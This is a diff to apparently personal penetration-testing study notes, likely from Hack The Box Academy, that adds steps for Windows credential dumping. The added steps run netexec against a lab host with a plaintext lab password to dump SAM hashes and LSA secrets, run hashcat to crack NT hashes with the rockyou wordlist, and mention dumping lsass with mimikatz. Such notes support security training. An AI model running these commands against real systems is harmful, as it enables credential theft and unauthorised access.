@@ -141,6 +141,23 @@ Use mimikatz tool. (Also if we have user with SeDebugPrivilege)
 
    https://github.com/Andre92Marcos/tools/tree/master/mimikatz
 
+Dump sam database for hashes
+
+```shell
+netexec smb 10.129.202.137 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
+# add the nt hash (last hash) to a file and crack it
+hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+
+Dump lsa secrets
+
+```shell
+netexec smb 10.129.202.137 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
+```
+
+Dump lsass secrets with mimikatz
+
+
 
 ## Other Tips
 
